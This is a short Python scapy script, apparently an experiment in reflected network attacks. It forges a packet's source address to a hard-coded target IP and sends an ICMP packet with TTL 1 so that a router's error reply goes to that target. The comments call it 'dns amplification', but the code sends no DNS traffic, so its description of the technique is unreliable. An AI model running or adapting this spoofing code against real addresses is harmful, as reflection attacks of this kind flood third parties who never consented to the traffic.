#!/usr/bin/python

from scapy.all import *

#dns amplification - send a mini packet to X IP, modify packet's src IP to target. check if router sends error packet to target
target_ip="142.233.103.142"
destination_ip="142.233.103.142" #some valid IP that doesn't rlly matter

#construct ICMP packet
packet = IP(src=target_ip, dst=destination_ip, ttl=1, len=64)/ICMP(id=int(0x05cc))/"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

reply = sr1(packet, timeout=5, verbose=0) # send packet AND receive reply

if reply is None:
    print("reply is none. check wireshark for the src of outgoing packet and router response packet's dst")
else:
    print("received packet. this shouldn't happen if dns amplification is working correctly", reply, reply.src)

